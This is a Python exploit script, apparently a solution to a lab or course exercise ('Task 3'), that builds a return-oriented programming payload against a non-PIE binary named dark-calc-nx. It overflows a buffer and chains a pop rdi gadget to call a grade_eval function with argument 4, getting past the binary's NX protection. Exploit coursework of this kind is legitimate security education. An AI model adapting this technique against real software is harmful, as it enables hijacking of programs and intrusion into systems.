#!/usr/bin/env python3
"""Task 3: ROP on dark-calc-nx.

dark-calc-nx has NX enabled (no stack execution) and ASLR enabled.
Non-PIE binary, so code addresses are fixed.

Gadgets found (in 0x4019d0-0x401ae3):
  pop rdi; ret at 0x401a33 (unaligned: 41 5f c3 -> 5f c3 = pop rdi; ret)
  grade_eval at 0x401978

ROP chain: pop rdi; ret -> 4 -> grade_eval
"""
import sys
import struct

pop_rdi_ret = 0x401a33
grade_eval = 0x401978

# Expression: 16 bytes padding
expr = b"A" * 16

# Saved rbp: 8 bytes
saved_rbp = b"B" * 8

# ROP chain at return address: pop rdi; ret -> 4 -> grade_eval
rop = (
    struct.pack("<Q", pop_rdi_ret)
    + struct.pack("<Q", 4)
    + struct.pack("<Q", grade_eval)
)

payload = expr + saved_rbp + rop
sys.stdout.buffer.write(payload)